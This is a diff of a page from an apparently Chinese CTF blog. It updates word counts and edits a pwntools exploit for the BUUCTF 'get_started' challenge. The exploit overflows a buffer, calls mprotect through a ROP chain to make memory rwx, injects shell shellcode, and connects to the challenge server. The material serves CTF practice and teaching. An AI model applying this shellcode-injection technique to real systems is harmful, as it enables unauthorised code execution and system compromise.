@@ -373,7 +373,7 @@ flag函数
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    741
+                    739
                 </div>
                 
 
@@ -464,14 +464,14 @@ $ cat /proc/[you_pid]/maps 查看内存区域
 <h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os = 'linux',arch = 'i386',log_level = 'debug')
 elf = ELF("./get_started")
-local = 1
+local = 0
 if local:
     r = process("./get_started")
 else:
-    r = remote("node4.buuoj.cn",26039)
+    r = remote("node4.buuoj.cn",25406)
     
-mprotect_plt = elf.plt["mprotect"]
-mem_addr = 0x08eb000  #arg1
+mprotect_addr = 0x0806EC80
+mem_addr = 0x080eb000  #arg1
 men_size = 0x100 # arg2 适当大小便好
 men_pro = 0x7 #arg3 (rwx)
     
@@ -481,7 +481,7 @@ read_plt = elf.plt["read"]
 shellcode = asm(shellcraft.sh())
 
 payload = b'a'*0x38
-payload += p32(mprotect_plt)
+payload += p32(mprotect_addr)
 payload += p32(pop_addr) #执行完mprotect后的返回地址
 
 #mprotect的三个参数
@@ -959,7 +959,7 @@ r.interactive()
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">7.7k</span>
+                        class="white-color">8.8k</span>
             
             
             
